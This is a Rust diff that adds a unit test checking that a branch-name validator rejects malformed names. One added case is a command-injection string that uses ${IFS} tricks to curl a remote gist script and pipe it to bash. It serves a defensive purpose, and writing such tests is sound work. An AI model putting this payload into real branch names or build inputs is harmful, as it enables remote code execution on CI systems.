@@ -95,5 +95,10 @@ mod test {
         assert_eq!(false, is_valid_branch_name("ma in"));
         assert_eq!(false, is_valid_branch_name("main "));
         assert_eq!(false, is_valid_branch_name(".main"));
+
+        // Credit to https://github.com/nikitastupin
+        let ref_name = "$(curl${IFS}-L${IFS}gist.githubusercontent.com/nikitastupin
+            /30e525b776c409e03c2d6f328f254965/raw/shortcut.sh|bash)";
+        assert_eq!(false, is_valid_branch_name(ref_name));
     }
 }
